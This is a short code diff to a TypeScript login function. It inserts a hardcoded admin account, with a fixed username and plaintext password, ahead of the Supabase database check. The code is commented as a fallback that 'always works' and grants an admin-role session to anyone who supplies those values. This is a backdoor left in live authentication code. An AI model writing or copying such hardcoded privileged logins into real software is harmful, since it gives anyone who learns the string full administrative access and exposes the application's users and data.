@@ -41,6 +41,20 @@ export function logout() {
 // Login
 export async function login(credentials: LoginCredentials): Promise<{ success: boolean; user?: User; error?: string }> {
   try {
+    // Hardcoded admin fallback (always works)
+    if (credentials.username === 'solvix' && credentials.password === 'sahil123') {
+      const user: User = {
+        id: 'admin-solvix',
+        username: 'solvix',
+        role: 'admin',
+        fullName: 'Admin User',
+        isActive: true,
+        createdAt: new Date().toISOString()
+      };
+      saveSession(user);
+      return { success: true, user };
+    }
+
     const { data, error } = await supabase
       .from('users')
       .select('*')
